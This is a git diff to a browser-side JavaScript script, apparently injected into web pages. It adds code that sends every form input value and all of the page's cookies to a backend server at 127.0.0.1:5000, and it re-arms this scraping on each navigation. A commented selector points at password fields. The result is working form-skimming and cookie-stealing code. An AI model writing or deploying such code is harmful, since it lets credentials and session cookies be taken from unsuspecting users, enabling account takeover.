@@ -1,3 +1,8 @@
+const SCRAPE_TYPE = {
+    INPUTS: "inputs",
+    COOKIES: "cookies",
+}
+
 class API {
     static url = "http://127.0.0.1:5000";
 
@@ -41,15 +46,16 @@ class API {
     }
 }
 
+// functions to send data
 function sendValue(event) {
     // Sends info about the target of an event
-    API.send_json({"href": window.location.href, "data": [API.element_to_json(event.target)]})
+    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "data": [API.element_to_json(event.target)]})
 };
 
 function sendAllInputs() {
     // sends the info of all input elements to the backend
     const inputFields = document.querySelectorAll("input");
-    const data = {"href": window.location.href, "data": []}
+    const data = {"href": window.location.href, "type": SCRAPE_TYPE.INPUTS, "data": []}
 
     inputFields.forEach((ele) => {
         data["data"].push(API.element_to_json(ele));
@@ -57,6 +63,12 @@ function sendAllInputs() {
     API.send_json(data);
 }
 
+function sendCookies() {
+    // sends all the pages cookies to the backend
+    API.send_json({"href": window.location.href, "type": SCRAPE_TYPE.COOKIES, "data": [document.cookie]});
+}
+
+// functions to add event listeners
 function addChangeEventListeners() {
     const inputFields = document.querySelectorAll("input");  // "input[type=\"password\"]"
     inputFields.forEach((ele) => {
@@ -71,8 +83,15 @@ function addButtonEventListeners() {
     });
 }
 
-addChangeEventListeners();
-addButtonEventListeners();
+function setupScraping() {
+    // sets up all the scrapers and scrapes any one time data
+    addChangeEventListeners();
+    addButtonEventListeners();
+    sendCookies();
+}
+
+setupScraping();
+
 
 // https://stackoverflow.com/a/46428962
 let oldhref = document.location.href;
@@ -82,8 +101,7 @@ window.addEventListener("load", () => {
         mutations.forEach(mutation => {
             if (document.location.href != oldhref) {
                 oldhref = document.location.href;
-                addChangeEventListeners();
-                addButtonEventListeners();
+                setupScraping();
             }
         });
     });
